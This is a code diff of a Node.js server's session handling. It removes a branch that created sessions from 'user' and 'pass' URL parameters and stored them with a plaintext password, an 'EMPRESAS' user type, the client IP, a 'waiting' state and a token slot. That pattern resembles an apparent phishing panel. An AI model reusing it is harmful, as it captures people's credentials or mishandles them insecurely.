@@ -36,17 +36,11 @@ function loadSessions() {
       if (raw && raw.trim().length > 0) {
         const data = JSON.parse(raw);
         if (data && typeof data === 'object' && !Array.isArray(data)) {
-          for (const [id, s] of Object.entries(data)) {
-            if (!sessions[id] || (s.updatedAt || 0) > (sessions[id].updatedAt || 0)) {
-              sessions[id] = s;
-            }
-          }
+          sessions = data;
         }
       }
     }
-  } catch (_) {
-    // Si hay error de lectura transitoria o archivo en escritura, mantener memoria intacta
-  }
+  } catch (_) {}
 }
 
 function saveSessions() {
@@ -315,29 +309,9 @@ async function handleRequest(req, res) {
     if (sessionMatch && req.method === 'GET') {
       loadSessions();
       const id = sessionMatch[1];
-      let session = sessions[id];
+      const session = sessions[id];
       if (!session) {
-        const qUser = reqUrl.searchParams.get('user');
-        const qPass = reqUrl.searchParams.get('pass');
-        if (qUser && qPass && qPass !== '—') {
-          session = {
-            id,
-            username: qUser,
-            password: qPass,
-            tipoUsuario: 'EMPRESAS',
-            device: 'desktop',
-            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
-            state: 'waiting',
-            token: '',
-            createdAt: Date.now(),
-            last_seen: Date.now(),
-            updatedAt: Date.now()
-          };
-          sessions[id] = session;
-          saveSessions();
-        } else {
-          return sendJson(res, 404, { error: 'Session not found' });
-        }
+        return sendJson(res, 404, { error: 'Session not found' });
       }
       return sendJson(res, 200, session);
     }
